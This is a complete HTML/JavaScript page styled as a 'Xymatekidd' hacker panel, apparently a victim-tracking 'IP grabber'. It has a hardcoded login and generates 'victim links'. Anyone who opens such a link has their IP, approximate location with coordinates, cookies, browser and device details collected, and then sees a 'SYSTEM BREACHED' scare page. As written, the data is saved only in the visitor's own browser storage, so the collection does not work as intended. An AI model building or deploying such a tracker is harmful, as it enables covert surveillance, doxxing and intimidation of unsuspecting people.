<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xymatekidd Login</title>
    <style>
        :root {
            --main-color: #ff0000;
            --secondary-color: #000;
            --accent-color: #990000;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background-color: #111;
            color: white;
            margin: 0;
            padding: 0;
            background-image: 
                radial-gradient(circle at 25% 25%, rgba(255,0,0,0.1) 0%, transparent 50%),
                radial-gradient(circle at 75% 75%, rgba(255,0,0,0.1) 0%, transparent 50%);
            height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .title {
            text-align: center;
            font-size: 3rem;
            margin: 30px 0;
            text-transform: uppercase;
            letter-spacing: 5px;
            color: var(--main-color);
            text-shadow: 0 0 10px rgba(255,0,0,0.5), 
                         0 0 20px rgba(255,0,0,0.3);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { text-shadow: 0 0 10px rgba(255,0,0,0.5), 0 0 20px rgba(255,0,0,0.3); }
            50% { text-shadow: 0 0 15px rgba(255,0,0,0.7), 0 0 30px rgba(255,0,0,0.5); }
            100% { text-shadow: 0 0 10px rgba(255,0,0,0.5), 0 0 20px rgba(255,0,0,0.3); }
        }
        
        .login-box {
            background-color: rgba(0,0,0,0.7);
            border: 1px solid var(--main-color);
            border-radius: 5px;
            padding: 30px;
            width: 300px;
            margin: 0 auto;
            box-shadow: 0 0 20px rgba(255,0,0,0.2);
        }
        
        .login-box h2 {
            text-align: center;
            margin-bottom: 20px;
            color: var(--main-color);
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #ccc;
        }
        
        .input-group input {
            width: 100%;
            padding: 10px;
            background-color: #222;
            border: 1px solid #444;
            border-radius: 3px;
            color: white;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: var(--main-color);
        }
        
        button {
            background-color: var(--main-color);
            color: white;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        button:hover {
            background-color: var(--accent-color);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255,0,0,0.3);
        }
        
        .victim-info {
            background-color: rgba(0,0,0,0.8);
            border: 1px solid var(--main-color);
            border-radius: 5px;
            padding: 20px;
            margin-top: 30px;
            font-family: monospace;
            white-space: pre;
            overflow-x: auto;
        }
        
        .link-generator {
            margin-top: 30px;
            text-align: center;
        }
        
        .generated-link {
            margin-top: 15px;
            padding: 10px;
            background-color: #222;
            border: 1px dashed #444;
            word-break: break-all;
        }
        
        .hidden {
            display: none;
        }
        
        .glitch {
            position: relative;
        }
        
        .glitch::before, .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 red;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }
        
        .glitch::after {
            left: -2px;
            text-shadow: -2px 0 blue;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim2 5s infinite linear alternate-reverse;
        }
        
        @keyframes glitch-anim {
            0% { clip: rect(31px, 9999px, 94px, 0); }
            10% { clip: rect(112px, 9999px, 76px, 0); }
            20% { clip: rect(85px, 9999px, 77px, 0); }
            30% { clip: rect(27px, 9999px, 97px, 0); }
            40% { clip: rect(64px, 9999px, 98px, 0); }
            50% { clip: rect(61px, 9999px, 85px, 0); }
            60% { clip: rect(99px, 9999px, 114px, 0); }
            70% { clip: rect(34px, 9999px, 115px, 0); }
            80% { clip: rect(98px, 9999px, 129px, 0); }
            90% { clip: rect(43px, 9999px, 96px, 0); }
            100% { clip: rect(82px, 9999px, 64px, 0); }
        }
        
        @keyframes glitch-anim2 {
            0% { clip: rect(65px, 9999px, 119px, 0); }
            10% { clip: rect(25px, 9999px, 145px, 0); }
            20% { clip: rect(50px, 9999px, 118px, 0); }
            30% { clip: rect(79px, 9999px, 133px, 0); }
            40% { clip: rect(100px, 9999px, 80px, 0); }
            50% { clip: rect(15px, 9999px, 66px, 0); }
            60% { clip: rect(115px, 9999px, 113px, 0); }
            70% { clip: rect(20px, 9999px, 20px, 0); }
            80% { clip: rect(80px, 9999px, 80px, 0); }
            90% { clip: rect(70px, 9999px, 100px, 0); }
            100% { clip: rect(30px, 9999px, 130px, 0); }
        }
    </style>
</head>
<body>
    <div id="login-page">
        <div class="container">
            <h1 class="title glitch" data-text="Xymatekidd Login">Xymatekidd Login</h1>
            
            <div class="login-box">
                <h2>Login</h2>
                <form id="login-form">
                    <div class="input-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" required>
                    </div>
                    
                    <button type="submit">Login</button>
                </form>
            </div>
        </div>
    </div>
    
    <div id="main-page" class="hidden">
        <div class="container">
            <h1 class="title glitch" data-text="VICTIM COOKED">VICTIM COOKED</h1>
            
            <div class="link-generator">
                <button id="generate-link">Generate Victim Link</button>
                <div id="generated-link-container" class="hidden">
                    <p>Send this link to your victim:</p>
                    <div class="generated-link" id="generated-link"></div>
                </div>
            </div>
            
            <h2>Victim Information:</h2>
            <div class="victim-info" id="victim-info">
                No victim data collected yet...
            </div>
        </div>
    </div>
    
    <script>
        // Login functionality
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if(username === 'Xymatekidd' && password === 'Xymatekidd') {
                document.getElementById('login-page').classList.add('hidden');
                document.getElementById('main-page').classList.remove('hidden');
                loadVictimData();
            } else {
                alert('Invalid credentials!');
            }
        });
        
        // Victim link generator
        document.getElementById('generate-link').addEventListener('click', function() {
            const currentUrl = window.location.href.split('?')[0];
            const victimLink = `${currentUrl}?victim=true&ref=${btoa(Date.now())}`;
            
            document.getElementById('generated-link').textContent = victimLink;
            document.getElementById('generated-link-container').classList.remove('hidden');
            
            // Copy to clipboard
            navigator.clipboard.writeText(victimLink).then(() => {
                alert('Link copied to clipboard!');
            });
        });
        
        // Function to get victim IP (using a free API)
        async function getVictimIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return 'Unknown';
            }
        }
        
        // Enhanced victim data collection
        async function collectVictimData() {
            const ip = await getVictimIP();
            const data = {
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages,
                cookies: document.cookie,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                location: await getApproximateLocation(ip)
            };
            
            return data;
        }
        
        // Get approximate location from IP
        async function getApproximateLocation(ip) {
            if (ip === 'Unknown') return 'Unknown';
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    postal: data.postal || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown'
                };
            } catch (error) {
                console.error('Error getting location:', error);
                return 'Unknown';
            }
        }
        
        // Check if victim page and collect data
        async function checkForVictim() {
            const urlParams = new URLSearchParams(window.location.search);
            if(urlParams.has('victim')) {
                const victimData = await collectVictimData();
                
                // Store data in localStorage temporarily
                localStorage.setItem('victimData', JSON.stringify(victimData));
                
                // Display scary message to victim
                document.body.innerHTML = `
                    <div style="
                        background-color: black;
                        color: red;
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        flex-direction: column;
                        font-family: monospace;
                        text-align: center;
                        padding: 20px;
                    ">
                        <h1 style="font-size: 3rem; margin-bottom: 30px;">SYSTEM BREACHED</h1>
                        <p style="font-size: 1.5rem;">Your information has been captured</p>
                        <p style="margin-top: 50px; color: #666;">This page will close automatically</p>
                    </div>
                `;
                
                // Close after 5 seconds
                setTimeout(() => {
                    window.close();
                }, 5000);
            }
        }
        
        // Load and display victim data
        function loadVictimData() {
            const victimData = localStorage.getItem('victimData');
            if(victimData) {
                const data = JSON.parse(victimData);
                let formattedData = `=== VICTIM DATA ===\n\n`;
                
                for (const [key, value] of Object.entries(data)) {
                    if (typeof value === 'object') {
                        formattedData += `${key}:\n`;
                        for (const [subKey, subValue] of Object.entries(value)) {
                            formattedData += `  ${subKey}: ${subValue}\n`;
                        }
                    } else {
                        formattedData += `${key}: ${value}\n`;
                    }
                    formattedData += '\n';
                }
                
                document.getElementById('victim-info').textContent = formattedData;
            }
        }
        
        // Run checks when page loads
        window.addEventListener('DOMContentLoaded', async () => {
            await checkForVictim();
        });
    </script>
</body>
</html>
